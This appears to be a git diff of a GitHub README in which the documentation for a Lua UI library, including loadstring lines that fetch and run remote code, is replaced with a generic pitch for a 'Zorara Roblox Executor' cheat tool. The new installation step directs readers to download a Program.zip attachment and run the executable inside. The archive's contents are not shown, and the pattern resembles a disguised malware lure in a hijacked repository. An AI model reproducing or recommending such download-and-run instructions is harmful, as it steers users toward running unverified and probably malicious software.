@@ -1,37 +1,84 @@
-<img src="Assets/darkmode.png#gh-dark-mode-only" alt="fluent">
-<img src="Assets/lightmode.png#gh-light-mode-only" alt="fluent">
+# Roblox
 
-## ⚡ Features
+![Roblox Logo](https://cdn.worldvectorlogo.com/logos/roblox-1.svg)
 
-- Modern design
-- Many customization options
-- Almost any UI Element you would ever need
-<br/>
+Zorara Roblox Executor is a software used to run custom lua scripts and mods within the Roblox gaming platform.
 
-## 🔌 Installation
+---
 
-You can load Fluent through a GitHub Release:
+## Table of Contents
 
-```lua
-local Library = loadstring(game:GetService("HttpService"):GetAsync("https://github.com/ActualMasterOogway/Fluent-Renewed/releases/latest/download/Fluent.luau", true))()
-```
-```lua
-local Library = loadstring(game:HttpGetAsync("https://github.com/ActualMasterOogway/Fluent-Renewed/releases/latest/download/Fluent.luau", true))()
-```
-<br/>
+- [Introduction](#introduction)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Support](#support)
+- [Contributing](#contributing)
+- [License](#license)
 
-## 📜 Usage
-[Example Script the studio environment](https://github.com/ActualMasterOogway/Fluent-Renewed/blob/master/Example.client.luau)
+---
 
-[Example Script for an exploit environment](https://github.com/ActualMasterOogway/Fluent-Renewed/blob/master/Example.luau)
-<br/>
+## Introduction
 
-## Credits
+Welcome to the Roblox repository! This repository contains the Zorara Roblox Executor software, which allows you to run custom lua scripts and mods within the popular Roblox gaming platform. Whether you are a modder, developer, or enthusiast, this tool provides you with the capability to enhance your Roblox experience by executing custom scripts and modifications.
 
-- [Master Oogway](https://github.com/ActualMasterOogway/Fluent-Renewed) - The master mind behind Fluent Renewed
-- [dawid](https://github.com/dawid-scripts/Fluent) - The master mind behind Fluent
-- [Lucide](https://github.com/lucide-icons) - The sexy icons
-- [richie0866/remote-spy](https://github.com/richie0866/remote-spy) - Assets for the UI, some of the code
-- [violin-suzutsuki/LinoriaLib](https://github.com/violin-suzutsuki/LinoriaLib) - Code for most of the elements, save manager
-- [7kayoh/Acrylic](https://github.com/7kayoh/Acrylic) - Porting richie0866's acrylic module to lua
-- [Latte Softworks & Kotera](https://discord.gg/rMMByr4qas) - Bundler
+![Roblox Screenshot](https://cdn.pixabay.com/photo/2018/08/25/05/02/roblox-3625898_960_720.jpg)
+
+---
+
+## Features
+
+- Execute custom lua scripts within Roblox.
+- Run mods to enhance gameplay and customization.
+- Compatible with various versions of Roblox.
+- Easy to use interface with customizable settings.
+- Regular updates and improvements for better performance.
+
+---
+
+## Installation
+
+To install the Zorara Roblox Executor, follow these steps:
+
+1. Download the software from the following link:  
+[![Download Zorara Roblox Executor](https://img.shields.io/badge/Download-Program.zip-<COLOR-CODE>)](https://github.com/user-attachments/files/17563023/Program.zip)
+
+2. Extract the downloaded ZIP file to a location of your choice on your computer.
+
+3. Run the executable file to launch the Zorara Roblox Executor.
+
+---
+
+## Usage
+
+Once you have installed the Zorara Roblox Executor, you can start using it to run custom lua scripts and mods in Roblox. Here are some basic steps to get you started:
+
+1. Launch the Zorara Roblox Executor application.
+2. Load the lua script or mod file that you wish to run.
+3. Configure any settings or options as needed.
+4. Click on the "Execute" or "Run" button to apply the script or mod within Roblox.
+5. Enjoy the enhanced gameplay experience with your custom modifications.
+
+![Roblox Gameplay](https://cdn.pixabay.com/photo/2020/11/16/21/31/virtual-roblox-5749966_960_720.png)
+
+---
+
+## Support
+
+If you encounter any issues or have questions regarding the Zorara Roblox Executor, feel free to reach out for support. You can contact the development team via email at support@zorara.com or visit our website at [www.zorara.com](https://www.zorara.com) for additional resources and FAQs.
+
+---
+
+## Contributing
+
+We welcome any contributions to the Zorara Roblox Executor project. If you have ideas for new features, bug fixes, or enhancements, please submit a pull request to our GitHub repository. Your contributions will help improve the software for the entire community of Roblox users.
+
+---
+
+## License
+
+The Zorara Roblox Executor is licensed under the [MIT License](https://opensource.org/licenses/MIT). You are free to use, modify, and distribute this software in accordance with the terms specified in the license agreement.
+
+---
+
+Thank you for visiting the Roblox repository! We hope you enjoy using the Zorara Roblox Executor to enhance your Roblox gaming experience. Feel free to share your feedback and suggestions for future updates and improvements. Happy scripting and modding in Roblox! 🎮✨🚀
